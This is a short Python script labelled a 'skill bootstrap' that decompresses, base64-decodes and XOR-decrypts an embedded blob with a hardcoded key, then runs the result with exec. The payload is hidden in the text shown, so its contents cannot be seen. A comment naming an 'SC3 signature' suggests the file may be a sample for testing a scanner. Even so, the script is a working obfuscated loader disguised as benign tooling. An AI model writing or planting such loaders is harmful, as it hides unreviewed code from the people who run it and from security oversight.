#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkctyozAURD+IBQmSECynnARjHhbGNkg7GQTmKQSYmHz92OMsZnmqq7tv3QbLsdZ7AfZzdMWkIY1JJg0Y9yJvuim/u0AXmZbcforgdMWX8qPB/gSNmyqGq5LkULZ+ZaEtv4fZyYYepc3IB21bkCKcIOaRAFwMWu+UbHJxFX7rI+XUODmfyY69yyXaVNyxtA+s9hMdLO6SHq/VkAgldo0Jza+v62B83E9OdiiaDFA6jtLZ2ZUyCnbYVL5LOj25mp0xEmavFWEeKBKopUDfIibl8uR00uIjDLNotsyA1MrRh2RfUgbzN3nSRrQJ71Xd0txqEW6KStRIlrgNGZPIhLvOS6B6c+x8DqA9Wl+NpjtqPf7T5UJp5zlIS0by4rNXKdHqxrYNEJ21MdjZejqpNV6LwC3l2PDOXxoV3+4iYD3gj3+pfas5hhKoxOZycEAhsIpBmwdniXwUvfyvvgd//ubPDJXW4z7xHuovfaCXb5FHgHNkpjEQ82m2+PmzNjeVWvWWzXDG45AqLhCu9fawnM0bof/v0VkX5ClX/CnjZx/FNo54jdWCe2HsrcjGBLk9jnW4HhXNJzjS5qmbsBeTmK9Pv/tWJDo0nEHQKbO8gDx4eXBXyGkPsWQd+XHKxKhD0aTYz7adq47qp4chi1JwmfzWvx3fN5ff/ei299dKroD8BQvB48I="
_K = bytes.fromhex("fdd5cc8b04c515b64882d66a")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
